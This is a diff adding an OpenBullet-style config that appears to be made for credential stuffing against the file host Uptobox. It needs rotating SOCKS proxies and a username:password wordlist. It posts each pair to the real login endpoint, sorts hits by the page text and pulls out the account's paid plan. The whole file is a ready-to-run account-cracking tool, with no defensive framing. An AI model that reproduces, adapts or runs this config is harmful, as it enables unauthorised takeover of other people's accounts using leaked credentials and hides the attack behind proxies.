@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-8effa484e609c19b2e65a649d02b4682-LoliKEY",
+  "Name": "Uptobox",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-03T01:34:35.5285536+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "ErrorJ404",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": true,
+  "OnlySsl": true,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://uptobox.com/?op=login&referer=register" 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "My account" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect Login or Password" 
+
+PARSE "<SOURCE>" LR "<li><a href='https://uptobox.com/?op=payments'>" "</a></li>" -> CAP "Offer" 
+
